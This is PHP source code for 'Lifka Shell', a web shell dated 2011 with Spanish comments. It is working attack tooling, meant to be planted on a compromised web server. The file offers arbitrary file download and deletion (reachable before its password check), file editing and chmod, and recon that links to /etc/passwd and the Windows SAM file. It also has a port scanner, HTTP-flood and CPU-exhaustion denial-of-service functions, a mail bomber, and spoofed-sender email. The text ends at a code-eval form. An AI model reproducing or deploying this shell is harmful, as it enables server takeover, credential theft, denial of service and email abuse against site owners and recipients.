<?php
/*

  Izquierdo Vera, Javier
  javierizquierdovera@gmail.com
  ________________________________________________________________________________________________
 /_______________________________________________________________________________________________/|
|   ____             _____________      _        ____         ____            __________        | |
|  |=!!=|           |=!!=!!=!!=!!=|   |    _    |=!!=|      _|=!!=|         _|=!!=||=!!=|_      | |
|  |=!!=|           |=!!=!!=!!=!!=|   |   _     |=!!=|    _|=!!=|         _|=!!=|    |=!!=|__   | |
|  |=!!=|                |=!!=|       | __      |=!!=|___|=!!=|          |=!!=|_________|=!!=|  | |
|  |=!!=|                |=!!=|      _|_|       |=!!=||=!!=|__           |=!!=|!=!!=!!=!|=!!=|  | |
|  |=!!=|________    ____|=!!=|___  _|  |       |=!!=|   |=!!=|__        |=!!=|!=!!=!!=!|=!!=|  | |
|  |=!!=!!=!!=!!=!  |=!!=!!=!!=!!=|  |_  |      |=!!=|      |=!!=|_      |=!!=|         |=!!=|  | |
|  |=!!=!!=!!=!!=!  |=!!=!!=!!=!!=|  |_ _|      |=!!=|        |=!!=|     |=!!=|         |=!!=|  | |
|                                                                                               | |
|                    __   _  _   ___   _     _                                                  | |
|                   |     |  |   |     |     |                                                  | |
|                    --   |--|    __   |     |                                                  | |
|                      |  |  |   |     |     |                                                  | |
|                    --   -  -   ---   ----  ----                                               | |
|                                                                                               | |
|_______________________________________________________________________________________________|/
        2011
*/

@session_start();
error_reporting(0);
$password = "63a9f0ea7bb98050796b649e85481845"; //contraseña md5, por defecto: 'root'










$descargar=$_GET['descargar'];
if ($descargar <> "" ){
$path_parts = pathinfo("$descargar");
$entrypath=$path_parts["basename"];
$name = "$descargar";
$fp = fopen($name, 'rb');
header("Content-Disposition: attachment; filename=$entrypath");
header("Content-Length: " . filesize($name));
fpassthru($fp);
exit;}
$scan = range("B","Z");
$var1= $_SERVER['DOCUMENT_ROOT'];
$shelldir = $var1.$_SERVER['PHP_SELF'];
if ($opcion == 'tirar') {
$asda=str_repeat("99999999999999999999999999999999999999999999999999",99999);
for($i=0;$i<2;){
$buff=bcpow($asda, '3', 2);
$buff=null;
exit();}}
$frpath=$_GET['borrar'];
if ($frpath <> "") {
if (is_dir($frpath)){
$matches = glob($frpath . '/*.*');
if ( is_array ( $matches ) ) {
  foreach ( $matches as $filename) {
  unlink ($filename);
  rmdir("$frpath");
echo "<script language='javascript'> history.back(1)</script>"; } } }
  else{
unlink ("$frpath");
echo "<script language='javascript'> history.back(1)</script>";
exit(0);  }}
$opcion = $_GET[opcion];
if ($opcion == 'php_info') {
echo '<a style="color: black;" href="?opcion=info_sistema"><== Volver</a>';
echo phpinfo();
return 0;}
$nombre_s = 'Lifka Shell';
$nombre_princi = 'LIFKA SHELL';
$version = '1.0';
if (md5($_POST['pass']) == $password) {
$_SESSION["login"] = 'ok';
}
 if ($_SESSION["login"] != 'ok') {
 echo '<div style="text-align: left;"><form method="POST" action=""><span>Pass: </span><input type="password" name="pass"><input type="submit" VALUE="Entrar"></form>'; 
return 0;
}
exec('wget --help',$wget);
if ($wget) {
$wgete = 'On';
} else {
$wgete = 'Off';
}
if (get_magic_quotes_gpc() == "1" or get_magic_quotes_gpc() == "on") {
$magic = 'On';
} else {
$magic = 'Off';
}
exec("perl -h",$perl);
if ($perl) {
$perle = 'On';
} else {
$perle = 'Off';
}
$target = $_POST['target'];
$inicio = $_POST['inicio'];
$final = $_POST['final'];
$pathe = getcwd();
if(ini_get('safe_mode') ){
$safe = 'On';
}else{
$safe = 'Off';
}
$curl_on = @function_exists('curl_version');
if (@function_exists('mysql_connect')) {
$base = 'MySQL';
} elseif(@function_exists('mssql_connect')) {
$base = $base.' MSSQL';
} elseif(@function_exists('pg_connect')) {
$base = $base.' PostgreSQL';
} elseif(@function_exists('ocilogon')) {
$base = $base.' Oracle';
}
echo '<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"><html><head>  <meta content="text/html; charset=ISO-8859-1" http-equiv="content-type"><title>'.$nombre_s.'</title> 
  <style type="text/css">
a{
text-decoration:none;
border:0px;
}
a:visited{
text-decoration:none;
}
a:active{
text-decoration:none;
}
a:hover{
text-decoration:none;
}      
</style> </head><body style="background-color: black; color: rgb(0, 0, 0);" alink="#ee0000" link="#0000ee" vlink="#551a8b"><div style="text-align: center; background-color: rgb(7, 7, 7);"><big><a href="?"><big><big style="font-family: Aharoni;"><big><span style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000">'.$nombre_princi.'</span></big></big></big></a><br></big><hr style="width: 100%; height: 2px;"><big style="color: white;"><a style="color: white;" href="?">File manager</a> | <a style="color: white;" href="?opcion=info_sistema">System info</a></big><span style="color: white;"> | <a style="color: white;" href="?opcion=mail">Mail</a> | <a style="color: white;" href="?opcion=dos">DOS</a> | <a style="color: white;" href="?opcion=escaner_puertos">Port scan</a> | <a style="color: white;" href="?opcion=eval">Eval</a> | <a style="color: white;" href="?opcion=encode_decode">Encode/Decode</a> | <a style="color: white;" href="?opcion=salir">Logout</a></span><hr style="width: 100%; height: 2px;"><br><table style="width: 966px; height: 201px; text-align: left; margin-left: auto; margin-right: auto;" border="1" cellpadding="2" cellspacing="2">  <tbody>   <tr><td><span style="color: rgb(167, 167, 167);">';
if (isset($_GET['leer'])) {
header("Content-Type: application/octet-stream");
header("Content-Disposition: attachment; filename=".basename($_GET['leer']));
readfile($_GET['leer']);
echo '</tr> </tbody></table><br style="color: rgb(153, 153, 153);"><hr style="width: 100%; height: 2px; color: rgb(153, 153, 153);"><span style="color: rgb(153, 153, 153);">'.$nombre_s.' '.$version.'</span><br></div></body></html>';
exit(0);}
 $editar=$_GET['editar'];
 if ($editar <> "" ){
 $editar=realpath($editar);
 $lines = file($editar);
echo '<div style="text-align: center;"><big><big style="color: white;">Editar</big></big><div style="text-align: left;"><br><br><form action="" method="POST"><center>  <input type="text" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000" name="filepath"  size="60" value='.$editar.'><br/><textarea style="color: #A9F5F2; font-weight: bold; border: 1px dashed #333333; background-color: #000000" name="gardara" rows=30 cols=80>' ;
foreach ($lines as $line_num => $line) {
 echo htmlspecialchars($line);
}
echo '</textarea>
<br/>  <br/><input type="submit" style="color: #FF0000; font-weight: bold; border: 5px dashed #333333; background-color: #000000" value="Guardar"> <br/> <br/></form> </span></td>  </tr> </tbody></table><br style="color: rgb(153, 153, 153);"><hr style="width: 100%; height: 2px; color: rgb(153, 153, 153);"><span style="color: rgb(153, 153, 153);">'.$nombre_s.' '.$version.'</span><br></div></body></html>';
  $gardara=$_POST['gardara'];
  $filepath=realpath($_POST['filepath']);
  if ($gardara <> "") 
  {
  $fp=fopen("$filepath","w+");
  fwrite ($fp,"") ;
  fwrite ($fp,$gardara) ;
  fclose($fp);
  echo "<script language='javascript'> close()</script>";
  }
return 0;
 }
function tamaño($size){
if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
else {$size = $size . " B";}
return $size;}
function permisos($file) 
{ 
  $perms = fileperms($file);
  if (($perms & 0xC000) == 0xC000) {$info = 's';} 
  elseif (($perms & 0xA000) == 0xA000) {$info = 'l';} 
  elseif (($perms & 0x8000) == 0x8000) {$info = '-';} 
  elseif (($perms & 0x6000) == 0x6000) {$info = 'b';} 
  elseif (($perms & 0x4000) == 0x4000) {$info = 'd';} 
  elseif (($perms & 0x2000) == 0x2000) {$info = 'c';} 
  elseif (($perms & 0x1000) == 0x1000) {$info = 'p';} 
  else {$info = 'u';}
  $info .= (($perms & 0x0100) ? 'r' : '-');
  $info .= (($perms & 0x0080) ? 'w' : '-');
  $info .= (($perms & 0x0040) ?(($perms & 0x0800) ? 's' : 'x' ) :(($perms & 0x0800) ? 'S' : '-'));
  $info .= (($perms & 0x0020) ? 'r' : '-');
  $info .= (($perms & 0x0010) ? 'w' : '-');
  $info .= (($perms & 0x0008) ?(($perms & 0x0400) ? 's' : 'x' ) :(($perms & 0x0400) ? 'S' : '-'));
  $info .= (($perms & 0x0004) ? 'r' : '-');
  $info .= (($perms & 0x0002) ? 'w' : '-');
  $info .= (($perms & 0x0001) ?(($perms & 0x0200) ? 't' : 'x' ) :(($perms & 0x0200) ? 'T' : '-'));
  return $info;
} 
$fchmod=$_GET['fchmod'];
if ($fchmod <> "" ){
$fchmod=realpath($fchmod);
echo "<center><br>File: $fchmod<br><form method='POST' action=''><br>Chmod :<br><input type='text' name='chmod0' value='777' ><br><input type='submit' ";
echo ' style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000" value="Cambiar chmod"></form><br/>';
?>
<script language="JavaScript">
function calculator(user, number){
// Owner
if (user == "owner" && number == "4"){var box = eval("document.chmod.owner4")}
if (user == "owner" && number == "2"){var box = eval("document.chmod.owner2")}
if (user == "owner" && number == "1"){var box = eval("document.chmod.owner1")}
// Group
if (user == "group" && number == "4"){var box = eval("document.chmod.group4")}
if (user == "group" && number == "2"){var box = eval("document.chmod.group2")}
if (user == "group" && number == "1"){var box = eval("document.chmod.group1")}
// Other
if (user == "other" && number == "4"){var box = eval("document.chmod.other4")}
if (user == "other" && number == "2"){var box = eval("document.chmod.other2")}
if (user == "other" && number == "1"){var box = eval("document.chmod.other1")}
if (box.checked == true){
if (user == "owner"){
document.chmod.h_owner.value += ("+number")
var a= (document.chmod.h_owner.value)
var b= eval(a)
document.chmod.h_owner.value=b
document.chmod.t_owner.value=b
}if (user == "group"){
document.chmod.h_group.value += ("+number")
var a= (document.chmod.h_group.value)
var b= eval(a)
document.chmod.h_group.value=b
document.chmod.t_group.value=b
}if (user == "other"){
document.chmod.h_other.value += ("+number")
var a= (document.chmod.h_other.value)
var b= eval(a)
document.chmod.h_other.value=b
document.chmod.t_other.value=b
}
}
if (box.checked == false){
if (user == "owner"){
if (document.chmod.h_owner.value == ""){
document.chmod.t_owner.value=""
}else {
var a=(document.chmod.h_owner.value);
b=a-(number);
c=eval(b);
document.chmod.h_owner.value=c
document.chmod.t_owner.value=c
}}if (user == "group"){
if (document.chmod.h_group.value == ""){
document.chmod.t_group.value=""
}else {
var a=(document.chmod.h_group.value);
b=a-(number);
c=eval(b);
document.chmod.h_group.value=c
document.chmod.t_group.value=c
}}if (user == "other"){
if (document.chmod.h_other.value == ""){
document.chmod.t_other.value=""
}else {
var a=(document.chmod.h_other.value);
b=a-(number);
c=eval(b);
document.chmod.h_other.value=c
document.chmod.t_other.value=c
}}
}}
</script>
<form  name="chmod">
<input name="h_owner" type="hidden" value="">
<input name="h_group" type="hidden" value="">
<input name="h_other" type="hidden" value="">
<table bgcolor="#000000" cellpadding="5" cellspacing="1">
<tr bgcolor="#ffffff">
       <td colspan="4"><font face="verdana" size="3"><b>Calculate perms</b></font></td>
</tr><tr bgcolor="#ffffff" align="center">
       <td><font face="verdana" size="-1"><b>Perms</b></font></td>
       <td><font face="verdana" size="-1"><b>Owner</b></font></td>
       <td><font face="verdana" size="-1"><b>Group</b></font></td>
     <td><font face="verdana" size="-1"><b>Other</b></font></td>
</tr><tr bgcolor="#ffffff" align="center">
       <td><font face="verdana" size="-1"><b>Read</b></font></td>
       <td><input type="checkbox" name="owner4" value="4" onclick="calculator('owner', 4)"></td>
       <td><input type="checkbox" name="group4" value="4" onclick="calculator('group', 4)"></td>
       <td><input type="checkbox" name="other4" value="4" onclick="calculator('other', 4)"></td>
</tr><tr bgcolor="#ffffff" align="center">
       <td><font face="verdana" size="-1"><b>Write</b></font></td>
       <td><input type="checkbox" name="owner2" value="2" onclick="calculator('owner', 2)"></td>
       <td><input type="checkbox" name="group2" value="2" onclick="calculator('group', 2)"></td>
       <td><input type="checkbox" name="other2" value="2" onclick="calculator('other', 2)"></td>
</tr><tr bgcolor="#ffffff" align="center">
       <td><font face="verdana" size="-1"><b>Execute</b></font></td>
       <td><input type="checkbox" name="owner1" value="1" onclick="calculator('owner', 1)"></td>
       <td><input type="checkbox" name="group1" value="1" onclick="calculator('group', 1)"></td>
       <td><input type="checkbox" name="other1" value="1" onclick="calculator('other', 1)"></td>
</tr><tr bgcolor="#ffffff" align="center">
       <td><font face="verdana" size="-1"><b></b></font></td>
       <td><input type="text" name="t_owner" value="" size="1"></td>
       <td><input type="text" name="t_group" value="" size="1"></td>
       <td><input type="text" name="t_other" value="" size="1"></td>
</tr>
</table>
</form>
<br/>
<?
$chmod0=$_POST['chmod0'];
if ($_POST['chmod0']) {
if ($chmod0 <> ""){
chmod ($fchmod , $chmod0);
}else {
echo "No se permite cambiar Chmod";
}}
echo '   </tr>  </tbody></table><br style="color: rgb(153, 153, 153);"><hr style="width: 100%; height: 2px; color: rgb(153, 153, 153);"><span style="color: rgb(153, 153, 153);">'.$nombre_s.' '.$version.'</span><br></div></body></html>';
exit();
}
if ($opcion == 'info_sistema') {
echo '<div style="text-align: center;"><big><big style="color: white;">System info</big></big><div style="text-align: left;"><br/><b>&nbsp;&nbsp;<a style="color: white;" href="?opcion=php_info">PHP info</a><span style="color: white;"></b></span><br/><b>&nbsp;&nbsp;Sistema operativo:</b> '.php_uname().'<br/> <b>&nbsp;&nbsp;Server:</b> '.$_SERVER['SERVER_SOFTWARE'].'<br/><b>&nbsp;&nbsp;Versionn PHP:</b> '.PHP_VERSION.'<br/><b>&nbsp;&nbsp;Espacio:</b> '.tamaño(diskfreespace(getcwd())).'/'.tamaño(disk_total_space(getcwd())).'<br/><b>&nbsp;&nbsp;Host:</b> '.$_SERVER['HTTP_HOST'].'<br/><b>&nbsp;&nbsp;IP:</b> '.$_SERVER['SERVER_ADDR'].'<br/><b>&nbsp;&nbsp;Admin mail:</b> '.$_SERVER['SERVER_ADMIN'].'<br/><b>&nbsp;&nbsp;Safe Mode:</b> '.$safe.'<br/> <b>&nbsp;&nbsp;cURL:</b> '.(($curl_on)?('On'):('Off')).'<br/><b>&nbsp;&nbsp;Perl:</b> '.$perle.'.<br/><b>&nbsp;&nbsp;Magic quotes:</b> '.$magic.'.<br/><b>&nbsp;&nbsp;WGET:</b> '.$wgete.'.<br/><b>&nbsp;&nbsp;Bases de datos activas: </b>'.$base.'<br/>';
if (file_exists("C:/WINDOWS/repair/sam")) {
echo '<b>&nbsp;&nbsp;Found: </b><a href=?leer=C:/WINDOWS/repair/sam>SAM</a>';
}
if (file_exists("/etc/passwd")) {
echo '<b>&nbsp;&nbsp;Found: <style="color: white;"></b><a href=?leer=/etc/passwd>etc/passwd</a></div>';
}
echo '<br/>';
} elseif ($opcion == 'dos') {
echo '<div style="text-align: center;"><big><big style="color: white;">DOS</big></big><div style="text-align: center;"><br><br><big> <a style="color: white;" href="?opcion=ddos">DDOS</a>  </big>| <big><a style="color: white;" href="?opcion=derribar">DOS Local</a></big>';
} elseif ($opcion == 'escaner_puertos') {
echo '<div style="text-align: center;"><big><big style="color: white;">Port scan</big></big><br><br><br><center><form action="" method=POST><table border=0><td><b>Target: </b></td><td><input type=text name=target style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000" value=localhost></td><tr><td><b>Start: </b></td><td><input type=text style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000" name=inicio></td><tr><td><b>End: </b></td></b><td><input type=text style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000" name=final></td><tr></table><br><input type=submit style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000" value=Escanear></form><br>';
if ($target != '') {
echo '<b>Target: </b>'.$target.'<br>';
echo '<b>Rango: </b>'.$inicio.'-'.$final.'<br><br>';   
}
$final++;
for ( $i = $inicio ; $i < $final ; $i++ ) {
$abierto = @fsockopen($target,$i,$errno,$errstr,1);
if ($abierto) {
echo "<b>Port open: </b>".$i."<br>";
} else {
if ($target != '') {
echo "Port close: </b>".$i."<br>";
}}}
echo '<br>';
} elseif ($opcion == 'mail') {
echo '<div style="text-align: center;"><big><big style="color: white;">Mail</big></big><br><br><br><br> <big><a style="color: white;" href="?opcion=mail_bomber">Mail bomber</a></big> |<big> <a style="color: white;"href="?opcion=mail_anonimo">Mail anonymous</a></big>';
} elseif ($opcion == 'ddos') {
 echo '<div style="text-align: center;"><big><big style="color: white;">DDOS</big></big><br><br><br><br><form method="post"> <p align="center">URL:  <input name=ddosf size=50 style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"> Time:  <input name=timeddos size=6 value=100000 style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"><br> <input type=submit value="Send" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"></form></p>';
 if($_POST['ddosf'] && $_POST['timeddos']){
for ($id=0;$$id<$_POST['timeddos'];$id++){
$fp=null;
$contents=null;
$fp=fopen($_POST['ddosf'],"rb");
while (!feof($fp)) {
  $contents .= fread($fp, 8192);
}
fclose($fp);
}}
} elseif ($opcion == 'derribar') {
 echo '<div style="text-align: center;"><big><big style="color: white;">Dos local</big></big><br><br><br><br>Si pulsas el botón de abajo es probable que el servidor acabe caido, ¿estás seguro?<br/><br/><a style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000" href="?opcion=tirar" target="_blank">  ¡¡Tirar!!  </a>
';
 } elseif ($opcion == 'encode_decode') {
echo '<div style="text-align: center;"><big><big style="color: white;">Encode/decode</big></big><br><br>';
 $tipoe = 'Cadena';
$cadena = $_POST[cadena];
$tipoende = $_POST[tipoende];
if ($tipoende=='MD5 - encode') {
  $resultado = md5($cadena);
  } elseif ($tipoende=='MD4 - encode') {
  $resultado = hash('md4', $cadena);
  }
  elseif ($tipoende=='SHA1 - encode') {
  $resultado = sha1($cadena);
  }
   elseif ($tipoende=='SHA256 - encode') {
  $resultado = hash('sha256', $cadena);
  }
   elseif ($tipoende=='SHA384 - encode') {
  $resultado = hash('sha384', $cadena);
  }
   elseif ($tipoende=='SHA512 - encode') {
  $resultado = hash('sha512', $cadena);
  }
   elseif ($tipoende=='ripemd128 - encode') {
  $resultado = hash('ripemd128', $cadena);
  }
   elseif ($tipoende=='ripemd160 - encode') {
  $resultado = hash('ripemd160', $cadena);
  }
   elseif ($tipoende=='ripemd256 - encode') {
  $resultado = hash('ripemd256', $cadena);
  }
   elseif ($tipoende=='ripemd320 - encode') {
  $resultado = hash('ripemd320', $cadena);
  }
     elseif ($tipoende=='whirlpool - encode') {
  $resultado = hash('whirlpool', $cadena);
  }
     elseif ($tipoende=='tiger128,3 - encode') {
  $resultado = hash('tiger128,3', $cadena);
  }
     elseif ($tipoende=='tiger160,3 - encode') {
  $resultado = hash('tiger160,3', $cadena);
  }
     elseif ($tipoende=='tiger192,3 - encode') {
  $resultado = hash('tiger192,3', $cadena);
  }  
     elseif ($tipoende=='tiger128,4 - encode') {
  $resultado = hash('tiger128,4', $cadena);
  } 
     elseif ($tipoende=='tiger160,4 - encode') {
  $resultado = hash('tiger160,4', $cadena);
  }
     elseif ($tipoende=='tiger192,4 - encode') {
  $resultado = hash('tiger192,4', $cadena);
  }
     elseif ($tipoende=='snefru - encode') {
  $resultado = hash('snefru', $cadena);
  }      elseif ($tipoende=='gost - encode') {
  $resultado = hash('gost', $cadena);
  }
     elseif ($tipoende=='adler32 - encode') {
  $resultado = hash('adler32', $cadena);
  }     elseif ($tipoende=='crc32 - encode') {
  $resultado = hash('crc32', $cadena);
  }
     elseif ($tipoende=='crc32b - encode') {
  $resultado = hash('crc32b', $cadena);
  }     elseif ($tipoende=='haval128,3 - encode') {
  $resultado = hash('haval128,3', $cadena);
  }
     elseif ($tipoende=='haval160,3 - encode') {
  $resultado = hash('haval160,3', $cadena);
  }
       elseif ($tipoende=='haval192,3 - encode') {
  $resultado = hash('haval192,3', $cadena);
  }
     elseif ($tipoende=='haval224,3 - encode') {
  $resultado = hash('haval224,3', $cadena);
  }     elseif ($tipoende=='haval256,3 - encode') {
  $resultado = hash('haval256,3', $cadena);
  }
     elseif ($tipoende=='haval128,4 - encode') {
  $resultado = hash('haval128,4', $cadena);
  }       elseif ($tipoende=='haval160,4 - encode') {
  $resultado = hash('haval160,4', $cadena);
  }
     elseif ($tipoende=='haval192,4 - encode') {
  $resultado = hash('haval192,4', $cadena);
  }     elseif ($tipoende=='haval224,4 - encode') {
  $resultado = hash('haval224,4', $cadena);
  }
     elseif ($tipoende=='haval256,4 - encode') {
  $resultado = hash('haval256,4', $cadena);
  }
   elseif ($tipoende=='haval128,5 - encode') {
  $resultado = hash('haval128,5', $cadena);
  }
     elseif ($tipoende=='haval160,5 - encode') {
  $resultado = hash('haval160,5', $cadena);
  }
       elseif ($tipoende=='haval192,5 - encode') {
  $resultado = hash('haval192,5', $cadena);
  }
     elseif ($tipoende=='haval224,5 - encode') {
  $resultado = hash('haval224,5', $cadena);
  }     elseif ($tipoende=='haval256,5 - encode') {
  $resultado = hash('haval256,5', $cadena);
 } 
 elseif ($tipoende=='Base64 - encode') {
  $resultado = base64_encode($cadena);
  }
  elseif ($tipoende=='Base64 - decode') {
  $resultado = base64_decode($cadena);
  }
   elseif ($tipoende=='URL - encode') {
  $resultado = rawurlencode($cadena);
  }
  elseif ($tipoende=='URL - decode') {
  $resultado = rawurldecode($cadena);
  }
  if ($tipoende != ''){
 $tipoe = $tipoende; }
echo '<FORM METHOD="POST" NAME="consola" ACTION=""><span style="font-weight: bold;">'.$tipoe.':</span><br><textarea cols=70 rows=5 NAME="cadena" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000">'.$resultado.'</textarea><br><select name="tipoende" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"><option selected>MD5 - encode</option><option>MD4 - encode</option><option>SHA1 - encode</option><option>SHA256 - encode</option><option>SHA384 - encode</option><option>SHA512 - encode</option><option>ripemd128 - encode</option><option>ripemd160 - encode</option><option>ripemd256 - encode</option><option>ripemd320 - encode</option><option>whirlpool - encode</option><option>tiger128,3 - encode</option><option>tiger160,3 - encode</option><option>tiger192,3 - encode</option><option>tiger128,4 - encode</option><option>tiger160,4 - encode</option><option>tiger192,4 - encode</option><option>snefru - encode</option><option>gost - encode</option><option>adler32 - encode</option><option>crc32 - encode</option><option>haval128,3 - encode</option><option>haval160,3 - encode</option><option>haval192,3 - encode</option><option>haval224,3 - encode</option><option>haval256,3 - encode</option><option>haval128,4 - encode</option><option>haval160,4 - encode</option><option>haval192,4 - encode</option><option>haval224,4 - encode</option><option>haval256,4 - encode</option><option>haval128,5 - encode</option><option>haval160,5 - encode</option><option>haval192,5 - encode</option><option>haval224,5 - encode</option><option>haval256,5 - encode</option><option>Base64 - encode</option><option>Base64 - decode</option><option>URL - encode</option><option>URL - decode</option></select> <INPUT TYPE="submit" VALUE="Send" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"></FORM><pre></div>';
} elseif ($opcion == 'mail_bomber') {
echo '<div style="text-align: center;"><big><big style="color: white;">Mail Bomber</big></big><div style="text-align: left;"><br><form action="" method="post">  <center> <table border="1">    <table width="51%">      <tr>      <td>To:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>        <td><input name="destinatario" size="42" type="text" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"></td>     </tr>      <tr>       <td>Sender:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>        <td><input name="remitente" size="42" type="text" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"></td>    </tr>    <tr>       <td>Nombre:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>       <td><input name="nombreremitente" size="42" type="text" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"></td>      </tr>      <tr>       <td>Subject:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>      <td><input name="asunto" size="42" type="text" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"></td>     </tr>    <tr>       <td>Count:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>        <td><input name="cantidad" value="200" size="42" type="text" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"></td> </tr>  <tr>       <td>Message:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>    <td><textarea name="mensaje" rows="6" cols="40" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"></textarea></td>    </tr>     <tr>      </tr>    </tbody> </table><br><br><input name="Send" value="¡¡Bomber!!" type="submit" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"></p> </form><br/>';
if (isset($_POST['Send'])) {
$need .="MIME-Version: 1.0\n";
$need .="Content-type: text/html ; charset=iso-8859-1\n";
$need .="MIME-Version: 1.0\n";
$need .="From: ".$_POST['nombreremitente']." <".$_POST['remitente'].">\n";
$need .="To: ".$_POST['nombreremitente']."<".$_POST['remitente'].">\n";
$need .="Reply-To:".$_POST['remitente']."\n";
$need .="X-Priority: 1\n";
$need .="X-MSMail-Priority:Hight\n";
$need .="X-Mailer:Widgets.com Server";
echo "<br><br><br><center><h2>Result:</h2>";
for ($i = 1; $i <= $_POST['cantidad']; $i++) {
$listamails = 'Ninguna';
if ($listamails != "Ninguna") {
$open = fopen($listamails,"r");
while(!feof($open)) {
$word = fgets($open,255);
$word = chop($word);
if(@mail($word,$_POST['asunto'],$_POST['mensaje'],$need)) {
echo "[+] Send <b>$i</b> a <b>".$word."</b> successfully.<br>";
flush();
} else {
echo "[+] Send <b>$i</b> a <b>".$word."</b> error.<br>";
}}} else {
if(@mail($_POST['destinatario'],$_POST['asunto'],$_POST['mensaje'],$need)) {
echo "[+] Send <b>$i</b> a <b>".$_POST['destinatario']."</b> successfully.<br>";
flush();
} else {
echo "[+] Send <b>$i</b> a <b>".$_POST['destinatario']."</b> error.<br>";
}}}
echo "</center><br/><br/>  ";
}
} elseif ($opcion == 'mail_anonimo') {
                 $error    = ''; 
                 $Nombre     = ''; 
                 $emailto    = ''; 
                 $emailde  = ''; 
                 $asunto  = ''; 
                 $mensaje  = ''; 
            if(isset($_POST['send']))
            {
                 $Nombre     = $_POST['Nombre'];
                 $emailto    = $_POST['emailto'];
                 $emailde = $_POST['emailde'];
                 $asunto  = $_POST['asunto'];
                 $mensaje  = $_POST['mensaje'];
                if(trim($Nombre) == '') 
                {
                    $error = '<div class="errormsg">Write a name</div>';
                }
                  else if(trim($emailto) == '') 
                {
                    $error = '<div class="errormsg">Write a email</div>';
                }
                  if(trim($emailde) == '')
                {
                    $error = '<div class="errormsg">Write destinatario.</div>';
                }

                else if(trim($asunto) == '') 
                {
                    $error = '<div class="errormsg">Write a subject.</div>';
                }
        
        else if(trim($mensaje) == '') 
                {
                    $error = '<div class="errormsg">Write a message.</div>';
                }
                if($error == '')
                {
                    $a      = $emailto;
                    mail($a, $asunto, $mensaje, "From: $emailde\r\nReply-To: $emailto\r\nReturn-Path: $emailto\r\n");
    ?> 
                  <div style="text-align:center;">
                    <h1>Enviado</h1>
                       <p>Enviado correctamente a <b><?echo $emailto;?></b>.
             <br />

             </p>
                  </div>
</br>
<?php
                }          }
            if(!isset($_POST['send']) || $error != '')
            {
?>
  <?=$error;?>  
      <div style="text-align: center;"><big><big
 style="color: white;">Mail anonymous</big></big><div style="text-align: left;">
            <form  method="post" name="contFrm" id="contFrm" action="">
</br> 
      <table
 style="width: 110px; text-align: left; margin-left: auto; margin-right: auto;"
 border="0" cellpadding="2" cellspacing="2">
  <tbody>
    <tr>
      <td style="text-align: left;"><label><span class="required"></span> Name: </label></td>
      <td style="text-align: left;">  <input style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000" name="Nombre" type="text" class="box" id="Nombre" size="50" value="<?=$Nombre;?>" /></td>
    </tr>
    <tr>
      <td style="text-align: left;"><label><span class="required"></span> To: </label></td>
      <td style="text-align: left;">  <input style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000" name="emailto" type="text" class="box" id="Nombre" size="50" value="<?=$emailto;?>" /></td>
    </tr>
    <tr>
      <td style="text-align: left;"><label><span class="required"></span> Fake email: </label></td>
      <td style="text-align: left;"><input style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000" name="emailde" type="text" class="box" id="emailde" size="50" value="<?=$emailde;?>" /></td>
    </tr>
    <tr>
      <td style="text-align: left;"><label><span class="required"></span> Subject: </label></td>
      <td style="text-align: left;"><input style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000" name="asunto" type="text" class="box" id="asunto" size="50" value="<?=$asunto;?>" /></td>
    </tr>
    <tr>
      <td style="text-align: left;"><label><span class="required"></span> Message: </label></td>
      <td style="text-align: left;"><textarea rows="6"
 cols="45" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000" name="mensaje" type="text" class="box" id="mensaje" size="50" value="<?=$mensaje;?>" /></textarea></td>
    </tr>
  </tbody>
</table>
</br>               <center><input name="send" type="submit" class="button" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000" id="send" value="Send" />
</br></br>
            </form>        <?
}
} elseif ($opcion == 'salir') {
session_destroy();
echo '<div style="text-align: center;"><big>All sessions have been destroyed.</big></div>';
} elseif ($opcion == 'eval') {
echo "<div style='text-align: center;'><big><big style='color: white;'>Eval</big></big><br/><br/><form action='' method=POST><b>Código:</b><br/> <textarea  cols='47' rows='4' name=codigo style='color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000'>echo 'Lifka';";
